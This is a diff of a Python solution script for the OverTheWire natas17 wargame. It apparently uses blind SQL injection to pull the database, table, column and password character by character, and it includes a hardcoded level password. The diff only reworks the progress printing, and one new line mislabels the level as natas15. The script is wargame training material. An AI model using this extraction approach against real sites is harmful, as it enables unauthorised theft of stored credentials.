@@ -1,8 +1,8 @@
 from datetime import datetime
 import requests
+import sys
 
 def fl(url,username,password,len_alphanum,table,column):
-    print("Extracting password:")
     alpha_num = "812345679abcdefghijklmnopqrstuwvxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0" 
     flag = ""
     letter = 0
@@ -18,11 +18,13 @@ def fl(url,username,password,len_alphanum,table,column):
             flag = flag + alpha_num[letter]
             letter = 0
         else:
+            sys.stdout.write(f"\rExtracting password: {flag}{alpha_num[letter].ljust(20)}")
+            sys.stdout.flush()
             letter += 1
     if len(flag) != 32:
         fl(url,username,password,len_alphanum,table,column)
     else:
-        print("The flag for natas17 is: " + flag) 
+        print(f"\rThe flag for natas15 is:  {flag.ljust(20)}") 
 
 def cols(url,username,password,alpha_num,len_alphanum,database,table):
     column = ""
@@ -39,12 +41,13 @@ def cols(url,username,password,alpha_num,len_alphanum,database,table):
             column = column + alpha_num[letter]
             letter = 0
         else:
-            letter += 1        
+            sys.stdout.write(f"\rGetting column: {column}{alpha_num[letter].ljust(20)}")
+            sys.stdout.flush()
+            letter += 1      
     if column != "password":
         cols(url,username,password,alpha_num,len_alphanum,database,table)
     else:
-        print("Column is: " + column)
-        print("Getting flag for natas17:")
+        print(f"\rColumn is:  {column.ljust(20)}")
         fl(url,username,password,len_alphanum,table,column)
 
 def tables(url,username,password,alpha_num,len_alphanum,database):
@@ -62,12 +65,13 @@ def tables(url,username,password,alpha_num,len_alphanum,database):
             table = table + alpha_num[letter]
             letter = 0
         else:
+            sys.stdout.write(f"\rGetting table: {table}{alpha_num[letter].ljust(20)}")
+            sys.stdout.flush()
             letter += 1
     if table != "users":
         tables(url,username,password,alpha_num,len_alphanum,database)
     else:
-        print("Table is: " + table)
-        print("Getting column")
+        print(f"\rTable is:  {table.ljust(20)}")
         cols(url,username,password,alpha_num,len_alphanum,database,table)
 
 def db(url,username,password):
@@ -91,12 +95,13 @@ def db(url,username,password):
             database = database + alpha_num[letter]
             letter = 0
         else:
+            sys.stdout.write(f"\rGetting database: {database}{alpha_num[letter].ljust(20)}")
+            sys.stdout.flush()
             letter += 1
     if database != "natas17":
         db(url,username,password)
     else:
-        print("Database is: " + database)
-        print("Getting table")
+        print(f"\rDatabase is:  {database.ljust(20)}")
         tables(url,username,password,alpha_num,len_alphanum,database)
 
 if __name__=="__main__":
@@ -104,6 +109,5 @@ if __name__=="__main__":
     url = "http://natas17.natas.labs.overthewire.org/"
     username = "natas17"
     password = "XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd"
-    print("Getting database")
     db(url,username,password)
     
